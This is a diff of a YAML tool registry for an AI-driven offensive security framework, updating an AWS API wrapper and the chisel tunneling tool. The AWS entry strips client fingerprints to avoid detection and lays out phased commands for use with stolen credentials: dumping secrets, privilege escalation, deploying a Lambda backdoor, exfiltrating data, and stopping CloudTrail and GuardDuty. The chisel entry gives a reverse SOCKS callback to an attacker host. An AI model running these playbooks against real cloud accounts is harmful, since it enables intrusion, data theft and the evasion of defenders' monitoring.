@@ -1,5 +1,5 @@
 version: '2.0'
-updated_at: '2026-05-10T21:30:08Z'
+updated_at: '2026-05-10T23:34:30Z'
 tools:
   amass:
     name: amass
@@ -342,21 +342,32 @@ tools:
       purpose: Local graph database management (list, show, list events, etc.).
   aws:
     name: aws
+    kind: mcp
     version: '1.3'
-    description: Interactive AWS API client via awslabs aws-api-mcp-server (forked for offensive use). Translates AWS CLI
-      command strings into boto3 API calls. Supports ALL AWS services — IAM, S3, Lambda, DynamoDB, SQS, STS, EC2, Secrets
-      Manager, CloudTrail, and 200+ more. Batch mode (20 commands per call), all-region scanning, automatic pagination. User-Agent
-      fingerprint stripped for OPSEC. Credentials via env vars. For IAM privilege escalation use pacu. For attack path analysis
-      use cloudfox. For cloud security auditing use prowler.
+    description: 'AWS API client via AWS Labs'' OFFICIAL MCP server `awslabs.aws-api-mcp-server` (PyPI v1.3.x, Apache-2.0).
+      Thin wrapper: pip install + ~30-LOC Python that strips the awslabs User-Agent fingerprint (md/awslabs#mcp#aws-api-mcp-server#<version>)
+      for OPSEC and disables telemetry (AWS_API_MCP_TELEMETRY=false). Default 2-tool surface: `call_aws` (primary — execute
+      any AWS CLI command, single or batch up to 20, supports `--region *` for cross-region scans) and `suggest_aws_commands`
+      (NL fallback — NOTE: hits AWS Labs HTTPS endpoint with query text, OPSEC-leaky, agent should prefer call_aws). Optional
+      3rd tool `get_execution_plan` unlocks if EXPERIMENTAL_AGENT_SCRIPTS=true. The agent''s PRIMITIVE for AWS API access
+      on cloud engagements — every other AWS-related tool (pacu/cloudfox/prowler/s3scanner) sits on top of the same boto3
+      chain conceptually but exposes narrower read-only or pre-canned surfaces; aws is the only one that supports arbitrary
+      writes (privesc, persistence, exfil, defense evasion calls).'
+    source: https://github.com/awslabs/mcp/tree/main/src/aws-api-mcp-server
     image: ghcr.io/silicon-works/mcp-tools-aws:latest
-    image_size_mb: 400
+    image_size_mb: 347
     timeout_seconds: 600
+    idle_timeout_seconds: 1800
+    service: true
+    service_name: aws
     capabilities:
     - aws_api_access
     - iam_enumeration
     - s3_operations
     - lambda_operations
     - cloud_exploitation
+    - cross_region_scanning
+    - batch_api_calls
     phases:
     - reconnaissance
     - enumeration
@@ -366,29 +377,45 @@ tools:
       network: true
       privileged: false
     resources:
-      memory_mb: 512
+      memory_mb: 1024
       cpu: 0.5
+    allowed_env:
+    - AWS_ACCESS_KEY_ID
+    - AWS_SECRET_ACCESS_KEY
+    - AWS_SESSION_TOKEN
+    - AWS_REGION
+    - AWS_DEFAULT_REGION
+    - AWS_PROFILE
+    - AWS_API_MCP_PROFILE_NAME
+    - AWS_API_MCP_WORKING_DIR
+    - AWS_API_MCP_ALLOW_UNRESTRICTED_LOCAL_FILE_ACCESS
+    - READ_OPERATIONS_ONLY
+    - EXPERIMENTAL_AGENT_SCRIPTS
     routing:
       use_for:
-      - execute any AWS CLI command against an AWS account
-      - enumerate IAM users, roles, policies, and permissions
+      - execute any AWS CLI command against an AWS account (single or batch up to 20)
+      - enumerate IAM users, roles, policies, permissions
       - list and access S3 buckets and objects
       - inspect and invoke Lambda functions
       - scan DynamoDB tables and query data
       - check STS identity (who am I?) with stolen credentials
       - access Secrets Manager and Parameter Store
-      - enumerate EC2 instances, security groups, and user data
+      - enumerate EC2 instances, security groups, user data
       - interact with SQS queues
       - disable CloudTrail logging (if authorized)
+      - cross-region asset enumeration via --region *
       never_use_for:
-      - cloud security auditing/compliance (use prowler)
-      - IAM privilege escalation analysis (use pacu — it has 21+ privesc modules)
-      - attack path analysis (use cloudfox — it does cross-service correlation)
-      - S3 bucket brute-force discovery (use s3scanner)
+      - cloud security auditing/compliance (use prowler — runs hundreds of CIS/NIST/PCI checks)
+      - IAM privilege escalation analysis (use pacu — has 21+ privesc modules pre-built)
+      - attack path analysis (use cloudfox — cross-service trust-chain correlation)
+      - S3 bucket brute-force discovery from outside an account (use s3scanner)
       - secret scanning in S3 contents (use trufflehog)
+      - natural-language command suggestion in OPSEC-sensitive engagements — suggest_aws_commands hits AWS Labs telemetry
+        endpoint with query text (use call_aws with explicit commands instead)
       triggers:
       - aws
       - AWS CLI
+      - boto3
       - iam
       - s3
       - lambda
@@ -397,6 +424,7 @@ tools:
       - sts
       - ec2
       - secrets manager
+      - parameter store
       - cloudtrail
       - AWS API
       - cloud
@@ -405,25 +433,248 @@ tools:
     see_also:
     - tool: pacu
       reason: aws gives raw API access. pacu encodes exploitation knowledge — 21+ IAM privesc paths, persistence modules,
-        evasion techniques. Use aws for manual enumeration, pacu for automated exploitation.
+        evasion techniques. Use aws for manual enumeration + write ops, pacu for automated exploitation patterns.
     - tool: cloudfox
-      reason: aws makes individual API calls. cloudfox does cross-service attack path analysis (trust chains, role assumptions,
-        env var secrets). Use cloudfox for situational awareness.
+      reason: aws makes individual API calls. cloudfox does cross-service attack-path analysis (trust chains, role assumptions,
+        env-var secrets in instance metadata). Use cloudfox for situational awareness, then aws to execute discovered attack
+        paths.
     - tool: prowler
-      reason: Both interact with AWS APIs but prowler is read-only compliance auditing. aws allows read AND write operations
-        for exploitation.
+      reason: Both interact with AWS APIs but prowler is read-only compliance auditing across hundreds of CIS/NIST/PCI checks.
+        aws allows read AND write operations for exploitation.
     - tool: s3scanner
-      reason: Use s3scanner to discover unknown S3 buckets by name. Use aws to interact with known/discovered buckets.
+      reason: Use s3scanner to discover unknown S3 buckets by name fuzzing from outside the account. Use aws to interact with
+        known/discovered buckets from inside the account.
     - tool: trufflehog
-      reason: Use trufflehog to scan S3 bucket contents for secrets. Use aws for general S3 operations.
+      reason: Use trufflehog to scan S3 bucket contents (or git histories, filesystem dumps) for secrets. Use aws for general
+        S3 operations like listing/copying.
+    warnings:
+    - 'The `suggest_aws_commands` tool hits a remote AWS Labs HTTPS endpoint with the agent''s query text (verified vendor
+      source 2026-05-11). Defenders won''t see this in target''s CloudTrail (it''s not a target API call) but AWS Labs telemetry
+      does. **For OPSEC-sensitive engagements: NEVER call suggest_aws_commands; always use call_aws with explicit commands.**
+      There is no vendor env var to disable suggest_aws_commands as of v1.3.36; agent must self-discipline.'
+    - 'Vendor wraps every error in `result.content[0].text` with `isError: false` (NOT the standard MCP isError flag). Live-verified
+      2026-05-11: even fatal errors (no creds, invalid command) come back as success-shaped responses. **Agents must parse
+      the JSON content for an `error` key, not check isError.**'
+    - 'User-Agent fingerprint mitigation: vendor stamps `md/awslabs#mcp#aws-api-mcp-server#<version> cfg/ro#0 cfg/scripts#0`
+      into boto3 user_agent_extra by default. Defender CloudTrail sees the awslabs marker on every API call. Our `mcp-server.py`
+      patches the User-Agent to strip the awslabs prefix at startup — verify the patch still applies on vendor version bumps
+      (cfg/ro and cfg/scripts markers may also need stripping if upstream changes that path).'
+    - 'Credential leak risk: AWS creds typically arrive as env vars (AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + optional
+      AWS_SESSION_TOKEN). With service:true, these are set ONCE at container start via opensploit''s envOverrides and persist
+      across calls — much safer than per-call argv passing (which would expose creds in `docker inspect` and process listings).
+      Do NOT pass creds in cli_command argv (e.g., `aws s3 ls --aws-access-key-id ...`).'
+    notes: "## Architecture\n\n```\nopensploit ContainerManager (stdio MCP, service:true once per session)\n         │   docker\
+      \ run -i --rm\n         │     -e AWS_ACCESS_KEY_ID=... -e AWS_SECRET_ACCESS_KEY=...\n         │     -e AWS_SESSION_TOKEN=...\
+      \ -e AWS_REGION=us-east-1\n         │     -v ${sessionDir}:/session:rw\n         │     ghcr.io/silicon-works/mcp-tools-aws:latest\n\
+      \         ▼\nContainer's CMD: python3 mcp-server.py (~33 LOC wrapper)\n         │  • set AWS_API_MCP_TELEMETRY=false\
+      \ (kill awslabs telemetry)\n         │  • set AWS_API_MCP_TRANSPORT=stdio\n         │  • monkey-patch boto3 User-Agent\
+      \ to strip \"md/awslabs#mcp#aws-api-mcp-server#<version>\"\n         │  • from awslabs.aws_api_mcp_server.server import\
+      \ main; main()\n         ▼\nawslabs.aws-api-mcp-server v1.3.x (FastMCP v3.2.x)\n         │  serverInfo: name=\"AWS-API-MCP\"\
+      , version=\"<FastMCP framework version>\"\n         │  Default tool surface (2):\n         │    • call_aws — execute\
+      \ AWS CLI command(s), single or batch up to 20\n         │    • suggest_aws_commands — NL fallback (OPSEC-leaky, see\
+      \ warnings)\n         │  Conditional 3rd tool (if EXPERIMENTAL_AGENT_SCRIPTS=true):\n         │    • get_execution_plan\
+      \ — pre-baked AWS workflow scripts\n         ▼\nAWS API (boto3 + bundled awscli==1.45.x)\n         │  Reads creds via\
+      \ standard boto3 chain:\n         │  1. Env vars (AWS_ACCESS_KEY_ID/_SECRET/_SESSION_TOKEN)\n         │  2. ~/.aws/credentials\
+      \ + ~/.aws/config\n         │  3. EC2 instance metadata (IMDSv2)\n         │  4. ECS task role\n         ▼\nTarget AWS\
+      \ account (any service: IAM, S3, Lambda, EC2, Secrets, ...)\n\nCloudTrail in target account logs every call with userIdentity,\
+      \ sourceIPAddress,\nuserAgent (awslabs prefix stripped, but Boto3/X.Y.Z Python/Y.Z still visible —\nnot Prowler-level\
+      \ identifiable but distinguishable from console use).\n```\n\n## Tool surface (2 default + 1 conditional)\n\n```\ncall_aws\
+      \              (default, primary)         — Execute AWS CLI command(s), single or batch\nsuggest_aws_commands  (default,\
+      \ OPSEC-leaky)     — NL → command suggestions (calls AWS Labs HTTPS)\nget_execution_plan    (conditional, off by default)\
+      \ — Pre-baked workflow scripts (EXPERIMENTAL_AGENT_SCRIPTS=true)\n```\n\nVerified live 2026-05-11 against `ghcr.io/silicon-works/mcp-tools-aws:latest`:\n\
+      tools/list returns exactly 2 tools (call_aws + suggest_aws_commands).\nServer identifies as `AWS-API-MCP` v `3.2.4`\
+      \ (the FastMCP framework version,\nnot the underlying `awslabs.aws-api-mcp-server` package version which is 1.3.x).\n\
+      \n## Why a thin wrapper (no swap to retire)\n\n`awslabs.aws-api-mcp-server` was always a vendor MCP — there is no custom\
+      \ 400+-LOC\nreimplementation in this repo. Our `tools/aws/mcp-server.py` is 33 lines: env vars\n+ User-Agent patch +\
+      \ import-and-run vendor's main(). This was a `kind:mcp` (legacy\nimplicit) tool that just lacked the standardization\
+      \ layer (explicit kind, scenarios,\nfailure_signatures, smoke test) that mongodb/prowler got in May 2026 swaps and\n\
+      playwright got in its May 8 standardization. This file IS that standardization.\n\n## Engagement-class fit\n\n| Phase\
+      \ | What aws does for you |\n|---|---|\n| Identity discovery | `aws sts get-caller-identity`, `aws iam list-attached-role-policies`,\
+      \ `aws iam simulate-principal-policy` |\n| Account enumeration | `aws ec2 describe-instances --region *`, `aws s3 ls`,\
+      \ `aws lambda list-functions`, `aws secretsmanager list-secrets`, `aws ssm describe-parameters` |\n| Privilege escalation\
+      \ (write ops) | `aws iam create-access-key`, `aws iam update-assume-role-policy`, `aws lambda update-function-code`\
+      \ |\n| Lateral movement | `aws sts assume-role`, `aws ssm send-command`, `aws ec2-instance-connect send-ssh-public-key`\
+      \ |\n| Persistence | `aws iam create-login-profile`, `aws lambda create-function`, `aws events put-rule` |\n| Data exfiltration\
+      \ | `aws s3 sync s3://bucket /local/`, `aws dynamodb scan`, `aws ec2 create-snapshot` |\n| Defense evasion | `aws cloudtrail\
+      \ stop-logging`, `aws guardduty disable-organization-admin-account` |\n\nNone of pacu/cloudfox/prowler can do the write-side\
+      \ phases — those require `aws`.\n"
     methods:
-      execute_aws_command:
-        description: Execute any AWS CLI command via boto3. Accepts the full AWS CLI command string (e.g., 'aws sts get-caller-identity',
-          'aws s3 ls'). Supports batch mode with up to 20 commands per call.
-        when_to_use: For any AWS API interaction — IAM enumeration, S3 access, Lambda inspection, DynamoDB queries, SQS interaction,
-          and 200+ other AWS services. This is the swiss army knife for AWS pentesting.
-        params: {}
-        returns: {}
+      call_aws:
+        description: 'Execute AWS CLI command(s), single or batch up to 20. Vendor source: awslabs/aws_api_mcp_server/server.py:183.
+          Returns list[CallAWSResponse], each with `cli_command`, `response` (on success), or `error` (on failure). NOTE:
+          failures come back as 200-OK responses with isError:false — parse content[0].text JSON and check for `error` key.'
+        when_to_use: PRIMARY tool. Use whenever you know the exact AWS CLI command. Always prefer over suggest_aws_commands
+          (which is OPSEC-leaky). For cross-region scanning use `--region *` (vendor expands across all enabled regions).
+          Batch mode (list of command strings) is up to 20 commands per call — useful for parallel enum across services or
+          accounts.
+        params:
+          cli_command:
+            type: string
+            required: true
+            description: 'EITHER a single AWS CLI command string (e.g., ''aws sts get-caller-identity'') OR a JSON array of
+              up to 20 command strings (e.g., [''aws s3 ls'', ''aws iam list-users'']). MUST start with ''aws''. Pipe operators,
+              shell substitution, and redirects are FORBIDDEN by vendor — pure CLI args only. Use `--region *` for cross-region.
+              Verified vendor source 2026-05-11: vendor''s Pydantic schema accepts `str | list[str]`.'
+          max_results:
+            type: integer
+            description: Optional limit on the number of paginated results returned. Useful for sanity-checking before pulling
+              full datasets (e.g., `aws s3api list-objects-v2 --bucket huge-bucket` with max_results=100 to peek). Default
+              unlimited.
+      suggest_aws_commands:
+        description: '**OPSEC-LEAKY FALLBACK.** Suggest AWS CLI commands based on a natural-language query. Vendor source:
+          awslabs/aws_api_mcp_server/server.py:89. **Sends the query text over HTTPS to an AWS Labs endpoint** (verified vendor
+          source 2026-05-11 — calls `ENDPOINT_SUGGEST_AWS_COMMANDS` via requests.post). For OPSEC-sensitive engagements: never
+          call this. Use only when (1) you cannot determine the exact AWS service or operation, (2) the request is exploratory
+          and not against a sensitive target.'
+        when_to_use: DO NOT use against engagement targets. Only acceptable for exploratory work in personal/lab AWS accounts.
+          Always prefer `call_aws` with an explicit command. Vendor's own description acknowledges this is a 'FALLBACK' tool.
+        params:
+          query:
+            type: string
+            required: true
+            description: Natural-language description of what you want to do. Sent over HTTPS to AWS Labs telemetry endpoint.
+    failure_signatures:
+    - signal: No AWS credentials found. Please configure your AWS credentials
+      error_class: no_credentials
+      remediation: Container started without AWS_ACCESS_KEY_ID/_SECRET set. Set them via opensploit's envOverrides mechanism
+        BEFORE the first call. With service:true the env is set once at container start and persists across calls — do NOT
+        pass creds in cli_command argv (leaks via docker inspect). Verified live 2026-05-11.
+    - signal: The provided CLI command is not an AWS command
+      error_class: non_aws_command
+      remediation: 'Vendor validates that cli_command starts with ''aws''. Common mistake: passing a bash command (e.g., ''ls
+        /tmp'') OR forgetting to prepend ''aws'' (e.g., ''sts get-caller-identity''). Fix: every command MUST start with ''aws
+        ''. Verified live 2026-05-11.'
+    - signal: 'argument .*: expected one argument'
+      error_class: argv_validation
+      remediation: 'Generic awscli argv parser error — usually missing arg value (e.g., ''aws s3 ls --bucket'' without the
+        bucket name). Fix the argv. Note: `aws --version` itself fails this way through the MCP wrapper (vendor expects a
+        service positional arg). Verified live 2026-05-11.'
+    - signal: Number of batch commands exceeds the maximum limit of 20
+      error_class: batch_limit_exceeded
+      remediation: Vendor's MAX_BATCH_COMMANDS = 20 (verified vendor source config.py:189). Split the batch into chunks of
+        20.
+    - signal: Unable to locate credentials
+      error_class: no_credentials_botocore
+      remediation: 'Boto3-side variant of the no-creds error (different code path than the wrapper-side check). Same fix:
+        set AWS_ACCESS_KEY_ID/_SECRET via envOverrides.'
+    - signal: ExpiredToken|TokenRefreshRequired
+      error_class: expired_session_token
+      remediation: Temporary credentials (typically from sts:assume-role or instance metadata) have expired. Either re-acquire
+        via sts:assume-role with the underlying long-term creds, or re-extract fresh creds from the target. Update AWS_SESSION_TOKEN
+        env via envOverrides — service:true container picks up new env on next call.
+    - signal: AccessDenied|UnauthorizedOperation
+      error_class: iam_permission_denied
+      remediation: Current principal lacks the required IAM permission for this call. (1) Run `aws iam simulate-principal-policy`
+        to check what's actually allowed. (2) Try `aws sts get-caller-identity` to verify which principal the creds resolve
+        to (might be a less-privileged role than expected). (3) Check for SCP / permission-boundary restrictions if the IAM
+        policy looks permissive.
+    - signal: ThrottlingException|RequestLimitExceeded|TooManyRequestsException
+      error_class: api_throttle
+      remediation: AWS API throttle. Back off + retry with exponential delay. Common when fan-out enumeration runs --region
+        * across many services in batch mode. Reduce parallelism or insert delays between batches.
+    - signal: Invalid endpoint:.*for region
+      error_class: service_unavailable_in_region
+      remediation: The service isn't available in the target region (e.g., AWS GovCloud regions don't have all services).
+        Re-issue with --region us-east-1 (or another commercial region) if account scope allows.
+    gotchas:
+    - '**`isError: false` even on failure.** Vendor wraps every result (success or error) in result.content[0].text as a JSON
+      list of {cli_command, response|error}. Standard MCP isError flag is ALWAYS false. Agent must parse the content JSON
+      and check for `error` keys. Verified live 2026-05-11.'
+    - '**Default 2-tool surface, conditional 3rd.** call_aws + suggest_aws_commands always present. get_execution_plan only
+      appears if EXPERIMENTAL_AGENT_SCRIPTS=true. Our entrypoint does NOT enable it (the pre-baked scripts are business-task
+      workflows, not offensive). To enable for an engagement that wants pre-baked plans: add EXPERIMENTAL_AGENT_SCRIPTS=true
+      via envOverrides + restart container.'
+    - '**`suggest_aws_commands` calls home.** Verified vendor source 2026-05-11: hits AWS Labs HTTPS endpoint (`ENDPOINT_SUGGEST_AWS_COMMANDS`)
+      with raw query text. NO vendor env to disable. Agent must self-discipline: never call this against engagement targets.
+      Older versions of our wrapper set `AWS_API_MCP_ALLOW_SUGGEST=false` thinking it disabled this — that env var DOES NOT
+      EXIST in vendor source (verified). Removed from Dockerfile.'
+    - '**Cross-region wildcard.** `--region *` is a VENDOR EXTENSION (not standard awscli) — vendor expands it server-side
+      into one call per enabled region in the account. Use this instead of explicit batch loops over regions; vendor''s expansion
+      is more efficient + automatically handles new regions.'
+    - '**Batch is 20 max.** MAX_BATCH_COMMANDS=20 (vendor config.py:189). For larger fan-outs, chunk client-side.'
+    - '**Default region us-east-1.** If no AWS_REGION/AWS_DEFAULT_REGION env is set + cli_command has no --region, vendor
+      defaults to us-east-1. Many real engagements have resources in other regions — set AWS_REGION via envOverrides to your
+      target''s primary region OR always include --region in cli_command.'
+    - '**Working dir at /tmp/aws-api-mcp/workdir by default.** Vendor reads/writes files (e.g., for `aws s3 cp` operations
+      targeting local paths) here. To direct outputs into the session dir for cross-tool access, set AWS_API_MCP_WORKING_DIR=/session/aws-work
+      via envOverrides. Live-verified 2026-05-11: log line `CWD: /tmp/aws-api-mcp/workdir` appears at startup.'
+    - '**No vendor method to set credentials.** AWS creds come from the standard boto3 chain — env vars > ~/.aws/credentials
+      > IMDSv2 > ECS task role. With service:true container persistence, env vars (AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY
+      + optional AWS_SESSION_TOKEN) set once at container start are the cleanest path. Mounted ~/.aws/credentials inside /session
+      also works.'
+    - '**OPSEC: Boto3 user-agent still visible in CloudTrail.** Our wrapper strips the awslabs MCP fingerprint, but boto3''s
+      own UA (Boto3/1.41.x Python/3.13 Linux/...) remains. Defenders watching CloudTrail userAgent for non-console patterns
+      can still distinguish API-driven activity from console clicks. There is no way to make boto3 calls indistinguishable
+      from console — only to make them indistinguishable from legitimate boto3 clients.'
+    - '**READ-ONLY mode toggle.** Set READ_OPERATIONS_ONLY=true env (vendor''s env name, NOT prefixed with AWS_API_MCP_) to
+      make vendor reject write operations. For pure recon engagements where you want to be sure not to accidentally modify
+      state. Annotations on call_aws also flip readOnlyHint=True/destructiveHint=False when this is set.'
+    usage_patterns:
+    - name: phase 1 — identity & permission discovery
+      description: After credentials drop, immediately discover who you are + what you can do. Single batch call.
+      example: "call_aws({\n  cli_command: [\n    \"aws sts get-caller-identity\",\n    \"aws iam get-user\",\n    \"aws iam\
+        \ list-attached-user-policies --user-name <user-from-prev>\",\n    \"aws iam list-user-policies --user-name <user-from-prev>\"\
+        ,\n    \"aws iam simulate-principal-policy --policy-source-arn <arn> --action-names iam:* s3:* lambda:*\"\n  ]\n})\n"
+    - name: phase 2 — cross-region asset enumeration (batched)
+      description: Enumerate the visible attack surface across all regions in one batch call. Use --region * to fan out per-region
+        automatically.
+      example: "call_aws({\n  cli_command: [\n    \"aws ec2 describe-instances --region *\",\n    \"aws s3 ls\",\n    \"aws\
+        \ lambda list-functions --region *\",\n    \"aws iam list-users\",\n    \"aws iam list-roles\",\n    \"aws secretsmanager\
+        \ list-secrets --region *\",\n    \"aws ssm describe-parameters --region *\",\n    \"aws rds describe-db-instances\
+        \ --region *\",\n    \"aws dynamodb list-tables --region *\"\n  ],\n  max_results: 100\n})\n"
+    - name: phase 3 — secrets sweep
+      description: After enumeration, dump every secret you can read. Batch all known secret names at once.
+      example: "call_aws({\n  cli_command: [\n    \"aws secretsmanager get-secret-value --secret-id <name1>\",\n    \"aws\
+        \ secretsmanager get-secret-value --secret-id <name2>\",\n    \"aws ssm get-parameter --name <param1> --with-decryption\"\
+        ,\n    \"aws ssm get-parameter --name <param2> --with-decryption\"\n  ]\n})\n"
+    - name: phase 4 — privilege escalation (write ops)
+      description: Common AWS privesc primitives — pick based on what `iam simulate-principal-policy` confirmed in phase 1.
+        Each is a SINGLE call (one shot, not batched, so audit trail is cleaner if remediation is needed).
+      example: '// iam:CreateAccessKey on a higher-privilege user
+
+        call_aws({cli_command: "aws iam create-access-key --user-name target_admin"})
+
+        // iam:UpdateAssumeRolePolicy on an admin role to add yourself as trusted principal
+
+        call_aws({cli_command: "aws iam update-assume-role-policy --role-name AdminRole --policy-document file:///session/poc/assume-role-policy.json"})
+
+        // lambda:UpdateFunctionCode on a function that runs as admin role
+
+        call_aws({cli_command: "aws lambda update-function-code --function-name vulnerable-fn --zip-file fileb:///session/poc/backdoor.zip"})
+
+        '
+    - name: phase 5 — data exfiltration
+      description: Pull the data — S3 sync, DynamoDB scan, EBS snapshot for cross-account copy. exfiltration outputs go under
+        /session/exfil/ for downstream analysis tools.
+      example: "call_aws({\n  cli_command: [\n    \"aws s3 sync s3://target-data-bucket /session/exfil/s3-bucket/\",\n   \
+        \ \"aws dynamodb scan --table-name customer_data --output json\"\n  ]\n})\n// Then trigger snapshot copy cross-account\
+        \ (separate call to set --region)\ncall_aws({cli_command: \"aws ec2 create-snapshot --volume-id vol-xyz --description\
+        \ 'maintenance' --region us-east-1\"})\n"
+    - name: phase 6 — defense evasion / cleanup
+      description: 'Suppress detection if the engagement scope authorizes it. NOTE: stopping CloudTrail is itself logged as
+        `StopLogging` event — defenders see this. Disabling GuardDuty leaves an audit trail. Only useful as part of an exfiltration
+        sprint where alerting delay matters.'
+      example: 'call_aws({cli_command: "aws cloudtrail stop-logging --name <trail-name>"})
+
+        call_aws({cli_command: "aws guardduty disable-organization-admin-account --admin-account-id <account>"})
+
+        call_aws({cli_command: "aws config delete-config-rule --config-rule-name <rule>"})
+
+        '
+    - name: post-engagement — credential validation in lab
+      description: Quick sanity check that recovered creds work + identify what they can access, against your OWN lab account
+        first before turning them on the engagement target.
+      example: '// Set env first via envOverrides:
+
+        // AWS_ACCESS_KEY_ID=<recovered>, AWS_SECRET_ACCESS_KEY=<recovered>
+
+        call_aws({cli_command: "aws sts get-caller-identity"})
+
+        // If that succeeds — confirm region
+
+        call_aws({cli_command: "aws ec2 describe-availability-zones"})
+
+        '
   bloodhound:
     name: bloodhound
     kind: cli
@@ -1954,46 +2205,52 @@ tools:
       purpose: 'relay subcommand: NTLM relay listener (NOT for cli_in_container — interactive long-running. Prefer impacket-relay/ntlmrelayx.py)'
   chisel:
     name: chisel
+    kind: cli
+    binary: chisel
     version: 1.11.4
-    description: 'HTTP-based tunneling and SOCKS proxy via Chisel v1.11.4 (jpillora/chisel). Six methods: server (start chisel
-      listener), client_forward (forward tunnel — access server-side services locally), client_reverse (reverse tunnel — expose
-      client-side services on server), client_socks (SOCKS5 proxy through server''s network), list (show active tunnels),
-      close (terminate a process). Tunnels over HTTP/WebSocket with mandatory SSH encryption, traverses proxies and firewalls
-      that block raw SSH. Single Go binary, no dependencies. Server and client run as long-lived background processes tracked
-      in-memory by PID. Supports authentication (--auth user:pass), TLS, server fingerprint verification, and backend HTTP
-      proxying to hide chisel behind legitimate web servers. Client auto-reconnects with exponential backoff (100ms to 5min).
-      For SSH-based tunneling when SSH is available, use the tunnel tool instead — chisel is for when SSH ports are blocked
-      but HTTP/HTTPS is open.'
+    description: 'HTTP-based tunneling and SOCKS5 proxy via Chisel v1.11.4 (jpillora/chisel) — single Go binary, two subcommands
+      (server, client). Used for engagement-lifetime tunnels when SSH is blocked but HTTP/HTTPS is open: agent runs chisel
+      server in a persistent kind:cli container, target downloads + runs chisel client connecting back to the server with
+      R:<port>:socks reverse-SOCKS spec. The server''s fingerprint (base64 SHA256 of ECDSA public key) appears in stderr at
+      startup and goes to the client''s --fingerprint flag for MITM protection. Per-engagement use is single-server (1 container
+      holds for max_runtime_seconds) — for SSH-based tunneling prefer the `ssh` (kind:cli v3.0) ControlMaster + tunnel-flag
+      patterns since they don''t require a server-side process on the agent.'
     image: ghcr.io/silicon-works/mcp-tools-chisel:latest
     image_size_mb: 195
-    timeout_seconds: 600
-    service: true
-    service_name: chisel
+    idle_timeout_seconds: 600
+    max_runtime_seconds: 86400
+    timeout_seconds: 86400
     capabilities:
     - http_tunneling
     - port_forwarding
     - reverse_tunneling
-    - socks_proxy
+    - socks5_proxy
     - pivoting
-    - tunnel_management
+    - tls_tunneling
+    phases:
+    - post-exploitation
+    requirements:
+      network: true
+      privileged: false
+    resources:
+      memory_mb: 128
+      cpu: 0.25
     routing:
       use_for:
       - create HTTP-based tunnel when SSH port is blocked but HTTP/HTTPS is open
-      - set up forward port forwarding through chisel to access internal services
-      - create reverse tunnel to expose a compromised host's service on the attacker machine
-      - establish SOCKS5 proxy through chisel for pivoting into internal networks via HTTP
-      - tunnel through web proxies and firewalls that only allow HTTP/HTTPS traffic
-      - set up a chisel server with --reverse to receive reverse shells tunneled over HTTP
-      - access localhost-only services on a remote host by forwarding ports through chisel
-      - create an HTTP tunnel that looks like normal web traffic to evade network detection
+      - establish SOCKS5 proxy through compromised host for pivoting into internal networks via HTTP
+      - tunnel through web proxies and firewalls that only allow HTTP/HTTPS
+      - set up a chisel server with --reverse to receive reverse-shell-style tunnels from a compromised target
       - pivot through a compromised host to reach internal network segments via HTTP tunnel
       - hide chisel traffic behind a legitimate website using --backend reverse proxy
+      - run chisel client (agent-side) to connect to a known chisel server elsewhere for forward / SOCKS tunneling
       never_use_for:
-      - SSH tunneling when SSH is available (use tunnel — SSH is simpler and doesn't need a server component)
-      - port scanning through a tunnel (use nmap with proxychains after establishing SOCKS)
-      - file transfer (use ssh copy_to/copy_from or curl)
-      - reverse shell listeners (use netcat — chisel is for tunneling, not shell handling)
-      - IPsec VPN connections (use ike-scan for VPN discovery) — chisel is per-port tunneling, not full network VPN
+      - SSH tunneling when SSH is available — use the `ssh` tool's ControlMaster + tunnel-flag patterns (no server process
+        needed)
+      - port scanning through a tunnel (use nmap with proxychains after SOCKS is established)
+      - file transfer (use scp via ssh ControlMaster, or curl via tunnel)
+      - reverse shell listeners (use `nc` v2.0 held-listener pipeline pattern)
+      - IPsec VPN connections (use ike-scan for VPN discovery first; chisel is per-port tunneling)
       triggers:
       - chisel
       - HTTP tunnel
@@ -2005,278 +2262,205 @@ tools:
       - pivot HTTP
       - chisel server
       - chisel client
-    phases:
-    - post-exploitation
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.25
+      prefer_over: []
     see_also:
     - tool: ssh
-      reason: Use `ssh` (kind:cli v3.0, May 2026) for SSH-based tunneling when SSH is available — its ControlMaster + tunnel-flag
-        patterns (-L forward, -D SOCKS, -R reverse) cover everything the legacy `tunnel` (kind:mcp) tool did, and don't require
-        a server component on the agent side. The legacy `tunnel` tool was retired May 2026; SSH-based tunneling lives in
-        `ssh` now. Use chisel only when SSH is blocked / unavailable and HTTP is open.
+      reason: Prefer `ssh` (kind:cli v3.0) ControlMaster + tunnel-flag patterns (-L / -D / -R) when SSH is available. chisel
+        has the added cost of needing a server process on the agent + client binary on the target — only worth that overhead
+        when SSH is blocked. The legacy `tunnel` (kind:mcp) tool was retired May 2026; SSH-based tunneling lives in ssh now.
     - tool: nc
-      reason: Use for raw reverse shell listeners (held-listener pipeline pattern), then tunnel the shell through chisel if
-        needed. The legacy `netcat` (kind:mcp) tool was consolidated into `nc` (kind:cli v2.0, May 2026); search for either
-        name in the registry.
+      reason: Use `nc` v2.0 for raw reverse shell listeners (held-listener pipeline pattern); chisel is for tunneling, NOT
+        shell holding. Once a foothold yields a reverse shell on nc, agent can upload chisel binary via the held shell, then
+        run `chisel client http://attacker:port R:1080:socks` from inside the target shell.
     - tool: nmap
-      reason: After establishing a chisel SOCKS proxy, use nmap with proxychains to scan internal networks
-    methods:
+      reason: After establishing a chisel SOCKS proxy at localhost:1080, scan internal hosts via `proxychains -f /tmp/pc.conf
+        nmap ...` with pc.conf containing `socks5 127.0.0.1 1080`.
+    - tool: curl
+      reason: Once SOCKS is up, curl --socks5 127.0.0.1:1080 https://internal/ reaches internal services through the tunnel
+        — verified empirically 2026-05-10.
+    target_extraction: []
+    reject_flags: []
+    reject_flags_reason: chisel server takes no remote-target arg (it's a local listener). chisel client takes a server URL
+      — that's the only target-shaped argument. No reject_flags apply.
+    usage_patterns:
+    - name: Pattern C1 — chisel server (engagement-lifetime SOCKS/reverse listener)
+      binary: bash
+      command: -c 'mkdir -p /session/output/chisel && chisel server --reverse --socks5 --host 0.0.0.0 --port <port> 2>&1 |
+        tee /session/output/chisel/server-<port>.log'
+      when: 'Start a chisel server that listens for client connections over HTTP/WebSocket. Defaults enable --reverse (allow
+        target to push reverse tunnels back) and --socks5 (allow target to expose SOCKS5 endpoint). The `2>&1 | tee` captures
+        both stdout AND stderr (chisel writes the Fingerprint to stderr) to /session/output/chisel/server-<port>.log so a
